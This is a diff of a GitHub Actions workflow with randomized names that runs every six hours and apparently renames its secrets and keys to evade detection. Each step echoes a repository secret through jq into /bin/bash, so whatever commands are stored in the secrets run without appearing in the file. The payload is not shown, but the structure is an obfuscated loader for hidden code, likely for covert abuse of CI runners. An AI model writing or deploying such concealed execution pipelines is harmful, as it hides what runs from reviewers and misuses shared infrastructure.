@@ -1,9 +1,8 @@
 name: zhuqingliu2345
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +10,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhuqingliu2345
         env:
-          a947: ${{ secrets.a947 }}
+          vhmaz011: ${{ secrets.vhmaz011 }}
         run: |
-          echo $a947 | jq -r .eehzp37208 | /bin/bash
-          echo $sda5208 | jq -r .nt37894 | /bin/bash
-          echo $vu2140 | jq -r .rcmdl8 | /bin/bash
-          echo $klqam15 | jq -r .arl010 | /bin/bash
-          echo $r7 | jq -r .mawg0 | /bin/bash
+          echo $vhmaz011 | jq -r .oqz2 | /bin/bash
+          echo $hvn5 | jq -r .j952 | /bin/bash
+          echo $qcjs774 | jq -r .sz54 | /bin/bash
+          echo $zf7823 | jq -r .gklob1 | /bin/bash
+          echo $bmcgr7888 | jq -r .kjjkb30451 | /bin/bash
 
